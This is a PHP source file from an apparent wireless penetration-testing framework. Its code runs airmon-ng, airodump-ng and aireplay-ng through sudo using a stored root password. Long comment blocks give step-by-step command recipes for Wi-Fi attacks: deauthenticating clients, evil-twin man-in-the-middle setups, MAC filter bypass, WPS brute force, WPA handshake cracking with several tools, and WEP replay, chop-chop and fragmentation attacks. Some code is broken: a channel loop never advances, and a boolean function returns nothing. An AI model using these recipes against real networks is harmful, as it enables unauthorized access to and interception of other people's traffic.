<?php



class com4wifi extends com4dot {
    
    
    public function __construct() {
        parent::__construct();
    }
   
    
    public function wifi2ssid4hidden($stream,$wlan){
        $this->ssTitre(__FUNCTION__);
        $filter = "";
        $this->article("ESSID", " Access Point’s Broadcast name. (ie linksys, default, belkin etc) Some AP’s will not broadcast their name,But Airodump-ng can guess it");
        $data = "echo '$this->root_passwd' | sudo -S airodump-­ng $wlan";
        $this->req_str($stream, $data, $this->stream_timeout, $filter);
        /*
        FIND HIDDEN SSID

root@uceka:~# airmon-ng start wlan0
root@uceka:~# airodump-ng –c <Channel> --bssid <BSSID> wlan0mon
root@uceka:~# aireplay-ng -0 20 –a <BSSID> -c <VictimMac> wlan0mon 

         */
    }
    
    public function wifi2mitm($stream){
        /*
        MAN IN THE MIDDLE ATTACK

root@uceka:~# airmon-ng start wlan0
root@uceka:~# airbase-ng –e “<FakeBSSID>” wlan0mon
root@uceka:~# brctl addbr <VariableName>
root@uceka:~# brctl addif <VariableName> wlan0mon
root@uceka:~# brctl addif <VariableName> at0
root@uceka:~# ifconfig eth0 0.0.0.0 up
root@uceka:~# ifconfig at0 0.0.0.0 up
root@uceka:~# ifconfig <VariableName> up
root@uceka:~# aireplay-ng –deauth 0 –a <victimBSSID> wlan0mon
root@uceka:~# dhclient3 <VariableName> &
root@uceka:~# wireshark &
;select <VariableName> interface

Infernal Twin is an automated wireless penetration testing tool created to aid pentesters assess the security of a wifi network.
Using this tool you can create an Evil Twin attack, by creating a fake wireless access point to sniff network communications.
After creating a fake wifi access point you can eavesdrop users using phishing techniques and launch a man-in-the-middle attack targeting a particular user.


Wifiphisher is another great wifi pentesting tool for cracking the password of a wireless network.
It functions by creating a fake wireless access point which you can use for red team engagements or wifi security testing.
Using this tool you can easily achieve a man-in-the-middle position again wifi access clients by launching a targeted wifi association attack.

         
         
         */
    }
    
    public function wifi2bypassMAC($stream){
        /*
        BYPASS MAC FILTERING

root@uceka:~# airmon-ng start wlan0
root@uceka:~# airodump-ng –c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
root@uceka:~# aireplay-ng -0 10 –a <BSSID> -c <VictimMac> wlan0mon
root@uceka:~# ifconfig wlan0mon down
root@uceka:~# macchanger –-mac <VictimMac> wlan0mon
root@uceka:~# ifconfig wlan0mon up
root@uceka:~# aireplay-ng -3 –b <BSSID> -h <FakedMac> wlan0mon

         */
    }
    
    public  function wifi2manage2start($stream){
        $data = "echo '$this->root_passwd' | sudo -S systemctl status NetworkManager";
        $filter = "| grep 'Active:' | grep 'running' ";
        $check_network_start = $this->req_str($stream, $data, $this->stream_timeout, $filter);
        if (empty($check_network_start)) {
            $data = "echo '$this->root_passwd' | sudo -S systemctl start NetworkManager";
            $filter = "";
            $this->req_str($stream, $data, $this->stream_timeout, $filter);
            
        }
        $this->pause();
    }
    
    public  function wifi2device($stream){
        $this->titre(__FUNCTION__);

        $this->wifi2manage2start($stream);
        $interface_wifi = "";
        $filter= "";
        $this->ssTitre("Prints the connected wireless adapters");
        $this->ssTitre("Display Interface Wifi");
        $data = "echo '$this->root_passwd' | sudo -S airmon-ng";
        $this->req_tab($stream, $data, $this->stream_timeout, $filter);
        
        $this->ssTitre("How to find out the name of the wireless interface");
        $data = "echo '$this->root_passwd' | sudo -S iw dev";
        $check_exist = $this->req_str($stream, $data, $this->stream_timeout, $filter);

        $data = "echo '$this->root_passwd' | sudo -S nmcli device status";
        $filter = " | grep 'wifi' | awk '{print $1}' ";
        $interface_wifi = $this->req_str($stream, $data, $this->stream_timeout, $filter);
        $this->article("Interface WIFI", $interface_wifi);
        $this->ssTitre("Check Starting");
        $filter= "";
        $data = "echo '$this->root_passwd' | sudo -S airmon-ng check";
        $this->req_tab($stream, $data, $this->stream_timeout, $filter);
        return $interface_wifi;
    }
    
    public function wifi2connect($stream,$wlan,$essid,$wifipass){
        $this->ssTitre("connect to a Wi-Fi Access Point");
        $filename = sha1("$essid:$wifipass");
        $data = "wpa_passphrase $essid $wifipass > /tmp/$filename.wifi ";
        $filter = "";
        $this->req_str($stream, $data, $this->stream_timeout, $filter);
        $data = "wpa_supplicant -B -i $wlan -c /tmp/$filename.wifi ";
        $filter = "";
        $this->req_str($stream, $data, $this->stream_timeout, $filter);
        $data = "dhclient $wlan ";
        $filter = "";
        $this->req_str($stream, $data, $this->stream_timeout, $filter);
    }
    
    public  function wifi2ssid4visible($stream){
        $interface_wifi = $this->wifi2interface($stream);
        $this->ssTitre("Scans local APs - Access Points");
        $data = "echo '$this->root_passwd' | sudo -S iw dev $interface_wifi scan";
        $filter = "| grep \"SSID\"";
        $this->req_str($stream, $data, $this->stream_timeout, $filter);
        
        $data = "echo '$this->root_passwd' | sudo -S iwlist $interface_wifi scan";
        $filter = "| egrep \"DS Parameter set|SSID|Address\"";
        return $this->req_tab($stream, $data, $this->stream_timeout, $filter);
        
    }
    
    public function wifi2check4injection($stream,$wlan):bool{
        $this->ssTitre("Shows the monitor mode device");
        $data = "echo '$this->root_passwd' | sudo -S aireplay-ng -9 $wlan";
        $filter = "";
        $this->req_str($stream, $data, $this->stream_timeout, $filter);
    }
    
    public function wifi2check4monitor($stream):bool{
        $this->ssTitre("Shows the monitor mode device");
        $data = "echo '$this->root_passwd' | sudo -S iwconfig ";
        $filter = "| grep 'Monitor'";
        if (!empty($this->req_str($stream, $data, $this->stream_timeout, $filter))) return TRUE; 
        else return FALSE;
    }
    
    public function wifi2device4monitor($stream):string {
        $device_monitor = "";
        if ($this->wifi2check4monitor($stream)) {
        $data = "echo '$this->root_passwd' | sudo -S iwconfig ";
        $filter = "| grep 'Monitor' | awk '{print $1}' ";
        $device_monitor = $this->req_str($stream, $data, $this->stream_timeout, $filter);   
        $this->article("Interface MONITOR", $device_monitor);
        return $device_monitor ; 
        }
        else {
            return $device_monitor;        
        }
    }
    
    public function wifi2device2start($stream,$wlan){
        $this->ssTitre("Starts monitor mode on selected adapter");
        $data = "echo '$this->root_passwd' | sudo -S systemctl start NetworkManager";
        $filter = "";
        $this->req_str($stream, $data, $this->stream_timeout, $filter);
        $filter = "";
        //$this->wifi2device2monitor($stream, $wlan);
        
        $this->note("you must set your wireless card in monitor mode in order to enable packet capture and specify your wlan interface.");
        $data = "echo '$this->root_passwd' | sudo -S airmon-ng start $wlan ";
        $filter = "";
        $this->req_str($stream, $data, $this->stream_timeout, $filter);
    }
    
    
    public  function wifi2kill($stream,$wlan){
        $this->ssTitre(__FUNCTION__);

        
        $this->note("It is strongly recommended that before you set the Wi-Fi interface in monitor mode");

        $data = "echo '$this->root_passwd' | sudo -S systemctl stop NetworkManager";
        $filter = "";
        $this->req_str($stream, $data, $this->stream_timeout, $filter);
        $data = "echo '$this->root_passwd' | sudo -S airmon-ng check kill";
        $filter = "| awk '{print $1}' | grep -Po \"[0-9]{4,5}\" ";
        $tab_pids_wifiNetwork = $this->req_tab($stream, $data, $this->stream_timeout, $filter);
        foreach ($tab_pids_wifiNetwork as $pid){
            $data = "echo '$this->root_passwd' | sudo -S kill -9 $pid";
            $filter = "";
            if (!empty($pid)) $this->req_str($stream, $data, $this->stream_timeout, $filter);
        }
        sleep(1);
        $this->wifi2manage2start($stream);
    }
    
    
    
    public  function wifi($stream){
    $filter = "";
    // https://gist.github.com/dogrocker/86881d2403fee138487054da82d5dc2e
    // https://www.cybercureme.com/wireless-penetration-testing-checklist-a-detailed-cheat-sheet-2/
    // https://cs.piosky.fr/wifi/wpa/
    // https://www.safeharboroncyber.com/2018/05/04/wireless-penetration-testing-checklist-a-detailed-cheat-sheet/
    // https://gbhackers.com/wireless-penetration-testing-checklist-a-detailed-cheat-sheet/
    // https://miloserdov.org/?p=4819
    // https://purplesec.us/perform-wireless-penetration-test/
    // https://medium.com/@adam.toscher/wireless-penetration-tips-c0ed0a6665fe
    
    
    $this->titre("Attacking Methods");
    $this->article("1/2- Passive - Silence Mode", "sniffing the air for packets without sending any data to the AP or clients.");
    $this->article("2/2 - Active", "breaking the key while sending data to the AP or client.");
    $device_monitor = $this->wifi2device4monitor($stream);
    if (!empty($device_monitor)){
        $data = "echo '$this->root_passwd' | sudo -S airmon-ng stop $device_monitor";
        $filter = "";
        $this->req_str($stream, $data, $this->stream_timeout, $filter);
    }
    $this->pause();
    $wlan = $this->wifi2device($stream);$this->pause();
    $this->wifi2kill($stream,$wlan);$this->pause();
    if (!$this->wifi2check4monitor($stream, $wlan)) $this->wifi2device2start($stream,$wlan);
    $device_monitor = $this->wifi2device4monitor($stream);
    $this->article("Interface MONITOR", $device_monitor);
    $this->pause();
    for($channel=1;$channel<=14;$channel){
        $this->article("Channel",$channel);
        $this->wifi2bssid8channel($stream, $device_monitor, $channel);
        $this->pause();
    }
    $this->pause();

    /*
           Attacking Methods
 ARP Replay 

 Caffe­Latte

 Hirte 

 ChopChop / KoRek 

 FMS Attack

 PTW Attack
 

Hirte Attack(Extends for Caffe-Latte) steps
1 – Find a probe you want to hack and start the Hirte Attack :
airbase-ng -W 1 -c 6 -N --essid $ESSID-TO-HACK mon0
2 – Start saving the packets :
airodump-ng --channel $CH --bssid $BSSID --write dump-to-crack mon0
3 – Start cracking the CAP file
aircrack-ng dump-to-crack.cap
     */
}

public function wifi2scan($stream,$wlan):array{
    
    $this->ssTitre("Shows the access points and devices you can capture");
    $lines = array();
    // airodump-ng -w capture_airodump --channel 1 --output-format netxml mon0
    $data = "echo '$this->root_passwd' | sudo -S airodump-ng $wlan";
    $filter = "";
    $lines = $this->req_tab($stream, $data, $this->stream_timeout, $filter);
    return $lines ;
}


public function wifi4wap4method1($stream){
    $this->ssTitre("WPS Attack");
    /*
        Method 1 : WPS Attack

root@uceka:~# airmon-ng start wlan0
root@uceka:~# apt-get install reaver
root@uceka:~# wash –i wlan0mon –C
root@uceka:~# reaver –i wlan0mon –b <BSSID> -vv –S
#or, Specific attack
root@uceka:~# reaver –i –c <Channel> -b <BSSID> -p <PinCode> -vv –S
     */
}



public function wifi4wap4method2($stream){
    $this->ssTitre("Deauthenticate");
    $this->note("Deauthenticate with the broadcast address can be very efficient and convenient");
    /*
         Method 2 : Dictionary Attack

root@uceka:~# airmon-ng start wlan0
root@uceka:~# airodump-ng –c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
root@uceka:~# aireplay-ng -0 1 –a <BSSID> -c <VictimMac> wlan0mon
root@uceka:~# aircrack-ng –w <WordlistFile> -b <BSSID> <Handshaked_PCAP>

scapy

Capture WPA2
To capture packets from an access point use the following command:
airodump-ng -c [channel of access point] -bssid [access point] -w [filename] [adapter]
Leave this running in a sole terminal
To perform a deauthentication attack use the following command in a second terminal window:
aireplay-ng -0 1 -a [accesspoint] -c [client address] [adapter]
Check on the first terminal or tab, we should now have captured the handshake
To use a word list against the captured handshake use the following command:
aircrack-ng -0 -w [wordlist] [captured filename(.cap)]
     */
}



public function wifi4wap4method3($stream){
    $this->ssTitre("");
    /*
    
    Method 3 : Crack with John The Ripper

root@uceka:~# airmon-ng start wlan0
root@uceka:~# airodump-ng –c <Channel> --bssid <BSSID> -w <FileName> wlan0mon
root@uceka:~# aireplay-ng -0 1 –a <BSSID> -c <VictimMac> wlan0mon
root@uceka:~# cd /pentest/passwords/john
root@uceka:~# ./john –wordlist=<Wordlist> --rules –stdout|aircrack-ng -0 –e <ESSID> -w - <PCAP_of_FileName>

     */
}



public function wifi4wap4method4($stream){
    $this->ssTitre("");
    /*
     
    Method 4 : Crack with coWPAtty

root@uceka:~# airmon-ng start wlan0
root@uceka:~# airodump-ng –c <Channel> --bssid <BSSID> -w <FileName> wlan0mon
root@uceka:~# aireplay-ng -0 1 –a <BSSID> -c <VictimMac> wlan0mon
root@uceka:~# cowpatty –r <FileName> -f <Wordlist> -2 –s <SSID>
root@uceka:~# genpmk –s <SSID> –f <Wordlist> -d <HashesFileName>
root@uceka:~# cowpatty –r <PCAP_of_FileName> -d <HashesFileName> -2 –s <SSID>

     */
}



public function wifi4wap4method5($stream){
    $this->ssTitre("");
    /*
    
    Method 5 : Crack with Pyrit

root@uceka:~# airmon-ng start wlan0
root@uceka:~# airodump-ng –c <Channel> --bssid <BSSID> -w <FileName> wlan0mon
root@uceka:~# aireplay-ng -0 1 –a <BSSID> -c <VictimMac> wlan0mon
root@uceka:~# pyrit –r<PCAP_of_FileName> -b <BSSID> -i <Wordlist> attack_passthrough
root@uceka:~# pyrit –i <Wordlist> import_passwords
root@uceka:~# pyrit –e <ESSID> create_essid
root@uceka:~# pyrit batch
root@uceka:~# pyrit –r <PCAP_of_FileName> attack_db
     */
}



public function wifi4wap4method6($stream){
    $this->ssTitre("");
    /*
     
    Method 6 : Precomputed WPA Keys Database Attack

root@uceka:~# airmon-ng start wlan0
root@uceka:~# airodump-ng –c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
root@uceka:~# aireplay-ng -0 1 –a <BSSID> -c <VictimMac> wlan0mon
root@uceka:~# kwrite ESSID.txt
root@uceka:~# airolib-ng NEW_DB --import essid ESSID.txt
root@uceka:~# airolib-ng NEW_DB --import passwd <DictionaryFile>
root@uceka:~# airolib-ng NEW_DB --clean all
root@uceka:~# airolib-ng NEW_DB --stats
root@uceka:~# airolib-ng NEW_DB --batch
root@uceka:~# airolib-ng NEW_DB --verify all
root@uceka:~# aircrack-ng –r NEW_DB <Handshaked_PCAP>
     */
}


public function wifi4wap($stream){
    $this->titre(__FUNCTION__);
    $this->wifi4wap4method1($stream); // WPS Attack
    $this->wifi4wap4method2($stream); // Dictionary Attack
    $this->wifi4wap4method3($stream); // Crack with John The Ripper
    $this->wifi4wap4method4($stream); // Crack with coWPAtty
    $this->wifi4wap4method5($stream); // Crack with Pyrit
    $this->wifi4wap4method6($stream); // Precomputed WPA Keys Database Attack

}



public  function wifi2antenna4info($stream){

    $filter = "";
    $this->ssTitre("How to find out what frequencies the adapter supports and other specifications");
    $data = "echo '$this->root_passwd' | sudo -S iw list";
    $this->req_str($stream, $data, $this->stream_timeout, $filter);
    $data = "echo '$this->root_passwd' | sudo -S iw reg get";
    $this->req_str($stream, $data, $this->stream_timeout, $filter);
    $data = "echo '$this->root_passwd' | sudo -S iw list";
    $this->req_str($stream, $data, $this->stream_timeout, $filter);
    $this->ssTitre("Check if the wireless interfaces are blocked");
    $data = "echo '$this->root_passwd' | sudo -S rfkill";
    $this->req_str($stream, $data, $this->stream_timeout, $filter);
}

public function wifi2dot(){
    
}


public function wifi4wep4method1($stream){
    $this->ssTitre("Fake Authentication Attack");
    /*
         Method 1 : 

root@uceka:~# airmon-ng start wlan0
root@uceka:~# airodump-ng –c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
#What’s my mac?
root@uceka:~# macchanger --show wlan0mon
root@uceka:~# aireplay-ng -1 0 -a <BSSID> -h <OurMac> -e <ESSID> wlan0mon
root@uceka:~# aireplay-ng -2 –p 0841 –c FF:FF:FF:FF:FF:FF –b <BSSID> -h <OurMac> wlan0mon
root@uceka:~# aircrack-ng –b <BSSID> <PCAP_of_FileName>

    $this->ssTitre("");
    $data = "echo '$this->root_passwd' | sudo -S aireplay-ng -1 0 -e AP-SSID -a xx:xx:xx:xx:xx:xx -h yy:yy:yy:yy:yy:yy mon0";
    $this->req_tab($stream, $data, $this->stream_timeout, $filter);
     */
}

public function wifi4wep4method2($stream){
    $this->ssTitre("ARP Replay Attack");
    /*
        ARP Replay Attack steps
1 - Start capturing first Pockets :
airodump-ng --channel $CH --bssid $BSSID --write dump-to-crack mon0
2 - Starting ARP Reply Attack :
aireplay-ng --arpreplay -b $ESSID -x 100 -h $ORIGINAL-MAC mon0
3 – Start De-Auth Attack(Until you get ARP packets) :
aireplay-ng --deauth 1 -a $BSSID -h $CLIENT-MAC mon0
4 – Start cracking the CAP file.
aircrack-ng dump-to-crack.cap

    Method 2 : 

root@uceka:~# airmon-ng start wlan0
root@uceka:~# airodump-ng –c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
#What’s my mac?
root@uceka:~# macchanger --show wlan0mon
root@uceka:~# aireplay-ng -3 –x 1000 –n 1000 –b <BSSID> -h <OurMac> wlan0mon
root@uceka:~# aircrack-ng –b <BSSID> <PCAP_of_FileName>
     */
}

public function wifi4wep4method3($stream){
    $this->ssTitre("Chop Chop Attack");
    /*
    

    Method 3 : 

root@uceka:~# airmon-ng start wlan0
root@uceka:~# airodump-ng –c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
#What’s my mac?
root@uceka:~# macchanger --show wlan0mon
root@uceka:~# aireplay-ng -1 0 –e <ESSID> -a <BSSID> -h <OurMac> wlan0mon
root@uceka:~# aireplay-ng -4 –b <BSSID> -h <OurMac> wlan0mon
 #Press ‘y’ ;
root@uceka:~# packetforge-ng -0 –a <BSSID> -h <OurMac> -k <SourceIP> -l <DestinationIP> -y <XOR_PacketFile> -w <FileName2>
root@uceka:~# aireplay-ng -2 –r <FileName2> wlan0mon
root@uceka:~# aircrack-ng <PCAP_of_FileName>
     */
}

public function wifi4wep4method4($stream){
    $this->ssTitre("Fragmentation Attack");
    /*
   
    Method 4 : 

root@uceka:~# airmon-ng start wlan0
root@uceka:~# airodump-ng –c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
#What’s my mac?
root@uceka:~# macchanger --show wlan0mon
root@uceka:~# aireplay-ng -1 0 –e <ESSID> -a <BSSID> -h <OurMac> wlan0mon
root@uceka:~# aireplay-ng -5 –b<BSSID> -h < OurMac > wlan0mon
#Press ‘y’ ;
root@uceka:~# packetforge-ng -0 –a <BSSID> -h < OurMac > -k <SourceIP> -l <DestinationIP> -y <XOR_PacketFile> -w <FileName2>
root@uceka:~# aireplay-ng -2 –r <FileName2> wlan0mon
root@uceka:~# aircrack-ng <PCAP_of_FileName>
     */
}

public function wifi4wep4method5($stream){
    $this->ssTitre(__FUNCTION__);
    /*
    
    Method 5 : SKA (Shared Key Authentication) Type Cracking

root@uceka:~# airmon-ng start wlan0
root@uceka:~# airodump-ng –c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
root@uceka:~# aireplay-ng -0 10 –a <BSSID> -c <VictimMac> wlan0mon
root@uceka:~# ifconfig wlan0mon down
root@uceka:~# macchanger –-mac <VictimMac> wlan0mon
root@uceka:~# ifconfig wlan0mon up
root@uceka:~# aireplay-ng -3 –b <BSSID> -h <FakedMac> wlan0mon
root@uceka:~# aireplay-ng –-deauth 1 –a <BSSID> -h <FakedMac> wlan0mon
root@uceka:~# aircrack-ng <PCAP_of_FileName>


Airsnort is a free wifi pentesting tool that is used to crack wifi passwords for WEP networks.
It works by gathering network packets, examining them and then using them to compose the encryption key once enough packets have been gathered.

     */
}


public function wifi2device2monitor($stream,$wlan){
    $filter = "";
    $wlan = trim($wlan);
    $this->ssTitre("How to put a card in monitor mode before starting a Wi-Fi security audit on Linux");
    $data = "echo '$this->root_passwd' | sudo -S ip link set $wlan down";
    $this->req_str($stream, $data, $this->stream_timeout, $filter);
    $data = "echo '$this->root_passwd' | sudo -S iw dev $wlan | grep txpower";
    $this->req_str($stream, $data, $this->stream_timeout, $filter);
    /*
     Increase Wi-Fi TX Power
     
     root@uceka:~# iw reg set B0
     root@uceka:~# iwconfig wlan0 txpower <NmW|NdBm|off|auto>
     #txpower is 30 (generally)
     #txpower is depends your country, please googling
     root@uceka:~# iwconfig
     */
    // sudo iw dev <INTERFACE> set txpower fixed 30mBm
    $data = "echo '$this->root_passwd' | sudo -S iw $wlan set monitor control";
    $this->req_str($stream, $data, $this->stream_timeout, $filter);
    $data = "echo '$this->root_passwd' | sudo -S ip link set $wlan up";
    $this->req_str($stream, $data, $this->stream_timeout, $filter);
}

public function wifi2device2managed($stream,$wlan){
    $filter = "";
    $this->ssTitre("How to return the adapter to managed mode");
    $data = "echo '$this->root_passwd' | sudo -S ip link set $wlan down";
    $this->req_str($stream, $data, $this->stream_timeout, $filter);
    $data = "echo '$this->root_passwd' | sudo -S iw $wlan set monitor managed";
    $this->req_str($stream, $data, $this->stream_timeout, $filter);
    $data = "echo '$this->root_passwd' | sudo -S ip link set $wlan up";
    $this->req_str($stream, $data, $this->stream_timeout, $filter);
}

public function wifi4LEAP($stream){
    $this->titre(__FUNCTION__);
}


public function wifi4unencrypted($stream){
    $this->titre(__FUNCTION__);
}


public function wifi4wep($stream){
    $this->titre(__FUNCTION__);
    $this->wifi4wep4method1($stream); // Fake Authentication Attack
    $this->wifi4wep4method2($stream); // ARP Replay Attack
    $this->wifi4wep4method3($stream); // Chop Chop Attack
    $this->wifi4wep4method4($stream); // Fragmentation Attack
    $this->wifi4wep4method5($stream); // SKA (Shared Key Authentication) Type Cracking
}

public function wifi2bssid8channel($stream,$wlan,$channel){  
    $this->ssTitre("");
    $filter = "";
    $filename = sha1("$wlan:$channel");
    $data = "echo '$this->root_passwd' | sudo -S airodump-ng -c $channel -w /tmp/$filename $wlan";
    $this->req_str($stream, $data, $this->stream_timeout, $filter);
    sleep(10);
    return ;
}

public function wifi2clients8bssid($stream,$wlan,$channel,$bssid){
    $this->ssTitre("");
    $filter = "";
    $filename = sha1("$wlan:$channel");
    $data = "echo '$this->root_passwd' | sudo -S airodump-ng -c $channel --bssid $bssid -w /tmp/$filename $wlan";
    $this->req_str($stream, $data, $this->stream_timeout, $filter);
}



}
?>